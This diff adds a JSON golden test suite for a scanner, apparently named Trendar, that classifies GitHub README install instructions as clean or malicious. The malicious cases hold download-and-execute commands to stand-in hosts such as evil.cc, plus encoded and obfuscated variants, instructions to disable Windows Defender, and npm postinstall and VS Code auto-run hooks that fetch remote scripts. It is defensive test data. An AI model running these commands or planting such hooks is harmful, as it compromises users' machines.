@@ -1,0 +1,301 @@
+{
+  "version": 1,
+  "description": "Trendar Golden Test Suite — Benign, Malicious Baseline (v3), Evasion/Obfuscation (v4), Fuzzy Cluster, Metadata Lure, and Opt-in Manifest cases",
+  "readme_cases": [
+    {
+      "id": "benign-scoop",
+      "category": "benign",
+      "expected": "clean",
+      "repo": { "owner": "ScoopInstaller", "name": "Scoop", "language": "PowerShell", "forks": 2000, "size": 5000 },
+      "readme": "# Scoop\nInstall:\n```powershell\nirm https://get.scoop.sh | iex\n```\n"
+    },
+    {
+      "id": "benign-bun",
+      "category": "benign",
+      "expected": "clean",
+      "repo": { "owner": "oven-sh", "name": "bun", "language": "Zig", "forks": 3000, "size": 120000 },
+      "readme": "# Bun\n```sh\ncurl -fsSL https://bun.sh/install | bash\n```\n"
+    },
+    {
+      "id": "benign-negation",
+      "category": "benign",
+      "expected": "clean",
+      "repo": { "owner": "dev", "name": "installer", "language": "Go", "forks": 12, "size": 450 },
+      "readme": "```powershell\nirm https://get.example.dev/install.ps1 | iex\n```\nNever disable Windows Defender or turn off real-time protection.\n"
+    },
+    {
+      "id": "benign-exclusion",
+      "category": "benign",
+      "expected": "clean",
+      "repo": { "owner": "dev", "name": "tool", "language": "Rust", "forks": 5, "size": 800 },
+      "readme": "```powershell\nirm https://example.dev/install.ps1 | iex\n```\nAdd `%LOCALAPPDATA%\\App` to Windows Defender exclusions instead of disabling protection.\n"
+    },
+    {
+      "id": "benign-smartscreen",
+      "category": "benign",
+      "expected": "clean",
+      "repo": { "owner": "dev", "name": "app", "language": "C#", "forks": 10, "size": 1200 },
+      "readme": "```powershell\nirm https://example.dev/install.ps1 | iex\n```\nIf SmartScreen appears, click \"More info\" -> \"Run anyway\".\n"
+    },
+    {
+      "id": "benign-table-pipes",
+      "category": "benign",
+      "expected": "clean",
+      "repo": { "owner": "docs", "name": "guide", "language": null, "forks": 0, "size": 12 },
+      "readme": "| Tool | Example |\n| --- | --- |\n| curl | curl https://example.invalid/a | sh helper |\n\nDisable Windows Defender.\n"
+    },
+    {
+      "id": "benign-defender-notifications",
+      "category": "benign",
+      "expected": "clean",
+      "repo": { "owner": "ops", "name": "cli", "language": "Go", "forks": 3, "size": 250 },
+      "readme": "```sh\ncurl -fsSL https://example.dev/install.sh | bash\n```\nYou can disable Windows Defender notifications in settings.\n"
+    },
+    {
+      "id": "benign-security-research-doc",
+      "category": "benign",
+      "expected": "clean",
+      "repo": { "owner": "blue-team", "name": "sigma-detection-rules", "language": "Python", "forks": 85, "size": 4200, "description": "MITRE ATT&CK and Sigma detection rules for threat hunting" },
+      "readme": "# Sigma Detection Rules (MITRE ATT&CK T1562.001)\nInstall CLI: `curl -fsSL https://sigmahq.io/install.sh | bash`\n\n## IOC Reference & Detection Example\nAdversaries often run `sc stop WinDefend` or `Set-MpPreference -DisableRealtimeMonitoring $true` to impair defenses (CVE-2024-0001 / YARA rule reference).\n"
+    },
+    {
+      "id": "benign-state-description",
+      "category": "benign",
+      "expected": "clean",
+      "repo": { "owner": "dev", "name": "screenshot-tool", "language": "TypeScript", "forks": 15, "size": 900 },
+      "readme": "```sh\ncurl -fsSL https://example.dev/install.sh | sh\n```\nNote: Windows Defender is disabled only in the screenshot VM used for benchmark capture.\n"
+    },
+    {
+      "id": "benign-only-protection-off",
+      "category": "benign",
+      "expected": "clean",
+      "repo": { "owner": "sys", "name": "bench", "language": "C++", "forks": 20, "size": 600 },
+      "readme": "If blocked during local compilation, pause Real-time protection and run local build.\n"
+    },
+    {
+      "id": "benign-korean-negation",
+      "category": "benign",
+      "expected": "clean",
+      "repo": { "owner": "krdev", "name": "mycli", "language": null, "forks": 0, "size": 10 },
+      "readme": "```sh\ncurl -fsSL https://krdev.example/install.sh | bash\n```\n설치 시 Windows Defender 실시간 보호를 절대 끄지 마세요. 백신을 비활성화하면 안 됩니다.\n"
+    },
+    {
+      "id": "mal-v3-cluster-rufus",
+      "category": "malicious_baseline",
+      "expected": "malicious",
+      "repo": { "owner": "TrackerMonarch", "name": "rufus", "language": null, "forks": 0, "size": 1 },
+      "readme": "# Rufus\n**This repository provides a pre-activated, free setup for Rufus.**\n1. Open Terminal as Administrator:\n```cmd\nirm https://windows-defender.cc/updater/Fix.ps1 | &(gcm i*x)\n```\n### Antivirus / SmartScreen Warnings\nIf the setup gets blocked, simply pause \"Real-time protection\" in your Windows Security settings, run the command again, and re-enable your antivirus immediately afterward.\n"
+    },
+    {
+      "id": "mal-v3-save-and-run",
+      "category": "malicious_baseline",
+      "expected": "malicious",
+      "repo": { "owner": "bad", "name": "setup", "language": null, "forks": 0, "size": 2 },
+      "readme": "```powershell\ncurl -sL windows-defender.cc/updater/Fix.ps1 > run.ps1 && powershell -File run.ps1\n```\nBefore installing, turn off Windows Defender.\n"
+    },
+    {
+      "id": "mal-v3-process-subst",
+      "category": "malicious_baseline",
+      "expected": "malicious",
+      "repo": { "owner": "bad", "name": "sub", "language": null, "forks": 0, "size": 2 },
+      "readme": "```sh\nbash <(curl -s https://x.example/i.sh)\n```\nTemporarily disable real-time protection.\n"
+    },
+    {
+      "id": "mal-v3-encoded-utf16",
+      "category": "malicious_baseline",
+      "expected": "malicious",
+      "repo": { "owner": "bad", "name": "enc", "language": null, "forks": 0, "size": 2 },
+      "readme": "```powershell\npowershell -NoP -W Hidden -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7ACAAaQByAG0AIABoAHQAdABwAHMAOgAvAC8AeAAuAGUAeABhAG0AcABsAGUALwBhAC4AcABzADEAIAB8ACAAaQBlAHgA\n```\n"
+    },
+    {
+      "id": "mal-v3-mshta",
+      "category": "malicious_baseline",
+      "expected": "malicious",
+      "repo": { "owner": "bad", "name": "hta", "language": null, "forks": 0, "size": 2 },
+      "readme": "```cmd\nmshta https://x.example/a.hta\n```\nStop-Service -Name WinDefend -Force\n"
+    },
+    {
+      "id": "mal-v3-codeless-generic-off",
+      "category": "malicious_baseline",
+      "expected": "malicious",
+      "repo": { "owner": "bad", "name": "shell", "language": null, "forks": 0, "size": 3 },
+      "readme": "```\nirm https://x.example/a.ps1 | iex\n```\nTemporarily disable your security software before running.\n"
+    },
+    {
+      "id": "evasion-01-ps-backtick",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "bt", "language": null, "forks": 0, "size": 3 },
+      "readme": "```powershell\ni`rm https://evil.cc/a.ps1 | i`ex\n```\nBefore installing, turn off Windows Defender.\n"
+    },
+    {
+      "id": "evasion-02-ps-var-url",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "varurl", "language": null, "forks": 0, "size": 3 },
+      "readme": "```powershell\n$u = \"https://evil.cc/a.ps1\"\nirm $u | iex\n```\nBefore installing, turn off Windows Defender.\n"
+    },
+    {
+      "id": "evasion-03-ps-concat-iex",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "concat", "language": null, "forks": 0, "size": 3 },
+      "readme": "```powershell\nirm https://evil.cc/a.ps1 | & (\"i\"+\"ex\")\n```\nBefore installing, turn off Windows Defender.\n"
+    },
+    {
+      "id": "evasion-04-ps-format-op",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "fmt", "language": null, "forks": 0, "size": 3 },
+      "readme": "```powershell\nirm https://evil.cc/a.ps1 | & (\"{1}{0}\" -f 'ex','i')\n```\nBefore installing, turn off Windows Defender.\n"
+    },
+    {
+      "id": "evasion-05-curl-python3",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "pypipe", "language": null, "forks": 0, "size": 3 },
+      "readme": "```sh\ncurl -fsSL https://evil.cc/a.py | python3\n```\nBefore installing, turn off Windows Defender.\n"
+    },
+    {
+      "id": "evasion-06-curl-pwsh",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "pwshpipe", "language": null, "forks": 0, "size": 3 },
+      "readme": "```sh\ncurl -fsSL https://evil.cc/a.ps1 | pwsh\n```\nBefore installing, turn off Windows Defender.\n"
+    },
+    {
+      "id": "evasion-07-shell-base64",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "b64sh", "language": null, "forks": 0, "size": 3 },
+      "readme": "```sh\necho Y3VybCAtZnNTTCBodHRwczovL2V2aWwuY2MvYS5zaCB8IGJhc2g= | base64 -d | sh\n```\nBefore installing, turn off Windows Defender.\n"
+    },
+    {
+      "id": "evasion-08-shell-hex",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "hexsh", "language": null, "forks": 0, "size": 3 },
+      "readme": "```sh\necho 6375726c2068747470733a2f2f6576696c2e63632f612e7368207c207368 | xxd -r -p | sh\n```\nBefore installing, turn off Windows Defender.\n"
+    },
+    {
+      "id": "evasion-09-tab-enc",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "tabenc", "language": null, "forks": 0, "size": 3 },
+      "readme": "```powershell\npowershell\t-enc aQByAG0AIABoAHQAdABwAHMAOgAvAC8AZQB2AGkAbAAuAGMAYwAvAGEALgBwAHMAMQAgAHwAIABpAGUAeAA=\n```\nBefore installing, turn off Windows Defender.\n"
+    },
+    {
+      "id": "evasion-10-html-comment-dos",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "commentdos", "language": null, "forks": 0, "size": 4 },
+      "readme": "<!-- powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; powershell -enc AAAAAAAAAAAAAAAA; -->\n```powershell\npowershell -enc aQByAG0AIABoAHQAdABwAHMAOgAvAC8AZQB2AGkAbAAuAGMAYwAvAGEALgBwAHMAMQAgAHwAIABpAGUAeAA=\n```\nBefore installing, turn off Windows Defender.\n"
+    },
+    {
+      "id": "evasion-11-blank-lines-window",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "blanks", "language": null, "forks": 0, "size": 3 },
+      "readme": "```sh\ncurl -o a.sh https://evil.cc/a.sh\n\n\n\n# step 2\nbash a.sh\n```\nBefore installing, turn off Windows Defender.\n"
+    },
+    {
+      "id": "evasion-12-exclusion-smuggle",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "smuggle", "language": null, "forks": 0, "size": 3 },
+      "readme": "```powershell\nirm https://evil.cc/a.ps1 | iex\n```\nDisable Windows Defender instead of adding an exclusion.\n"
+    },
+    {
+      "id": "evasion-13-zero-width",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "zw", "language": null, "forks": 0, "size": 3 },
+      "readme": "```powershell\nirm https://evil.cc/a.ps1 | iex\n```\nTurn off Windows Def\u200Bender.\n"
+    },
+    {
+      "id": "evasion-14-cyrillic-homoglyph",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "homoglyph", "language": null, "forks": 0, "size": 3 },
+      "readme": "```powershell\nirm https://evil.cc/a.ps1 | iex\n```\nDis\u0430ble Windows Defender.\n"
+    },
+    {
+      "id": "evasion-15-lolbin-regsvr32",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "regsvr", "language": null, "forks": 0, "size": 3 },
+      "readme": "```cmd\nregsvr32 /s /n /u /i:https://evil.cc/a.sct scrobj.dll\n```\nBefore installing, turn off Windows Defender.\n"
+    },
+    {
+      "id": "evasion-16-non-english-korean",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": { "owner": "ev", "name": "kr", "language": null, "forks": 0, "size": 3 },
+      "readme": "```powershell\nirm https://evil.cc/a.ps1 | iex\n```\n설치 전에 Windows Defender 실시간 보호를 꺼 주세요.\n"
+    },
+    {
+      "id": "evasion-17-metadata-homepage-typosquat",
+      "category": "evasion_v4",
+      "expected": "malicious",
+      "repo": {
+        "owner": "RandomBotAcc99",
+        "name": "adobe-acrobat-pro-crack",
+        "language": null,
+        "forks": 0,
+        "size": 12,
+        "stars": 420,
+        "homepage": "https://www.dropbox.com/s/abc123/AdobeSetup.zip?dl=1",
+        "description": "Pre-activated free download crack bypass for Adobe Acrobat Pro 2026"
+      },
+      "readme": "# Adobe Acrobat Pro\nClick the repository website link above to get the pre-activated installer.\n"
+    }
+  ],
+  "traits_cases": [
+    {
+      "id": "evasion-ref-link-filehost",
+      "repo": { "owner": "ev", "name": "reflink" },
+      "readme": "[Download Setup.zip][1]\n\nSome text in between.\n\n[1]: https://mega.nz/file/AbC#key\n",
+      "expect_archive_filehost": true,
+      "expect_lure": true
+    },
+    {
+      "id": "evasion-fuzzy-simhash-comment-mutation",
+      "repo_a": { "owner": "owner1", "name": "manus-one" },
+      "repo_b": { "owner": "owner2", "name": "manus-two" },
+      "readme_a": "# Manus One\n\nDownload [Setup.rar](https://www.dropbox.com/s/1/Setup.rar?dl=1)\n\nThis assistant automates browser tasks, writes small scripts, manages local workflows, integrates cloud connectors, and accelerates daily productivity without manual setup steps. Designed for rapid cross-platform deployment and smooth execution on modern desktop systems.\n",
+      "readme_b": "# Manus Two\n\nDownload [Setup.rar](https://www.dropbox.com/s/2/Setup.rar?dl=1)\n\nThis assistant automates browser tasks, writes small scripts, manages local workflows, integrates cloud connectors, and accelerates daily productivity without manual setup steps. Designed for rapid cross-platform deployment and smooth execution on modern desktop systems.\n\n<!-- unique-campaign-id-88421 -->\nBuild tag: v2.0.1\n"
+    }
+  ],
+  "manifest_opt_in_cases": [
+    {
+      "id": "manifest-npm-postinstall-malicious",
+      "expected": "malicious",
+      "files": [
+        { "path": "package.json", "content": "{\"name\":\"helper\",\"scripts\":{\"postinstall\":\"curl -s https://evil.cc/p.sh | sh\"}}" }
+      ]
+    },
+    {
+      "id": "manifest-vscode-autorun-malicious",
+      "expected": "malicious",
+      "files": [
+        { "path": ".vscode/tasks.json", "content": "{\"version\":\"2.0.0\",\"tasks\":[{\"label\":\"init\",\"type\":\"shell\",\"command\":\"powershell -w hidden -c irm https://evil.cc/x.ps1 | iex\",\"runOptions\":{\"runOn\":\"folderOpen\"}}]}" }
+      ]
+    },
+    {
+      "id": "manifest-npm-clean",
+      "expected": "clean",
+      "files": [
+        { "path": "package.json", "content": "{\"name\":\"app\",\"scripts\":{\"build\":\"vite build\",\"test\":\"node --test\"}}" }
+      ]
+    },
+    {
+      "id": "manifest-decoy-tree-binary",
+      "expected": "malicious",
+      "tree": [
+        { "path": "README.md", "size": 1200 },
+        { "path": "loader.exe", "size": 450000 },
+        { "path": "Payload.zip", "size": 800000 }
+      ]
+    }
+  ]
+}
